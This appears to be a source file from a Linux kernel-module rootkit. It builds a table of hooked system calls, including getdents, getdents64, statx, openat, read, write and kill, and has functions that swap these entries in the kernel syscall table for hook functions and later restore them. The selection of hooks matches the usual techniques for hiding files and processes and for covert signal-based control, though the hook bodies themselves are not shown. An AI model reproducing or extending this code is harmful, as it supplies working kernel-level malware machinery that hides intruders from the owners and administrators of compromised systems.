#include <linux/module.h>
#include <linux/dirent.h>

#include "hooks.h"
#include "calls.h"
#include "util.h"

struct Call calls[] = {
  {.code=__NR_newfstatat, .name="newfstatat", .hook=h_newfstatat},
  {.code=__NR_getdents64, .name="getdents64", .hook=h_getdents64},
  {.code=__NR_getdents,   .name="getdents",   .hook=h_getdents},
  {.code=__NR_openat,     .name="openat",     .hook=h_openat},
  {.code=__NR_statx,      .name="statx",      .hook=h_statx},
  {.code=__NR_chdir,      .name="chdir",      .hook=h_chdir},
  {.code=__NR_write,      .name="write",      .hook=h_write},
  {.code=__NR_kill,       .name="kill",       .hook=h_kill},
  {.code=__NR_read,       .name="read",       .hook=h_read},
};

bool clean_calls(unsigned long* systable){
  int i = 0;
  for(;i< sizeof(calls)/sizeof(struct Call); i++){
    systable[calls[i].code] = calls[i].org;
    print("%s: 0x%px -> 0x%px",
        calls[i].name, calls[i].hook, calls[i].org);
  }

  return true;
}

bool setup_calls(unsigned long* systable){
  int i = 0;
  for(;i< sizeof(calls)/sizeof(struct Call); i++){
    calls[i].org = systable[calls[i].code];
    systable[calls[i].code] = calls[i].hook;
    print("%s: 0x%px -> 0x%px",
        calls[i].name, calls[i].org, calls[i].hook);
  }

  return true;
}

syscall find_org(char* name){
  int i = 0;
  for(;i< sizeof(calls)/sizeof(struct Call); i++){
    if(eq(name, calls[i].name)){
      return calls[i].org;
    }
  }

  return NULL;
}
